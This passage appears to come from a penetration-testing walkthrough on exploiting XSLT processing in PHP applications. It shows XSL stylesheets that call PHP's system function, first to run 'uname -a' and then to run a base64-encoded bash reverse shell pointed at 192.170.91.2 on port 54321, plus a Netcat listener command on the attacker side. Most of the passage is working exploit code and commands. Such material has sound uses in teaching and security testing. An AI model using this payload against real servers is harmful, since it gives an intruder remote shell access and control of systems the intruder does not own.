            <!-- Output: 'Php Can Now Be Used In Xsl' -->
        </html>
    </xsl:template>
</xsl:stylesheet>
```

Notice that we have specified the **uname -a** command to be executed via the PHP **system** function.

If the backend XSLT processing code has registered PHP functions, then the above code would run, and we will see the output of the **uname -a** command on the resulting page.

Next, we will base64-encode the reverse shell payload to avoid it being tampered with while uploading over HTTP:

```
echo "/bin/bash -c 'bash -i>& /dev/tcp/192.170.91.2/54321 0>&1'" | base64 -w0 ; echo
```

**Note:** Make sure to replace the IP address in the above command.

Add the reverse shell payload in the XSL file:

**test.xsl:**

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<!-- We add the PHP's xmlns -->
    <xsl:template match="/">
        <html>
            <!-- We use the php suffix to call the functions -->
            <xsl:value-of select="php:function('system','echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pPiYgL2Rldi90Y3AvMTkyLjE3MC45MS4yLzU0MzIxIDA+JjEnCg==|base64 -d|bash')" />
            <!-- Output: 'Php Can Now Be Used In Xsl' -->
        </html>
    </xsl:template>
</xsl:stylesheet>
```

Start a Netcat listener on the attacker machine:

```
nc -lvp 54321
```
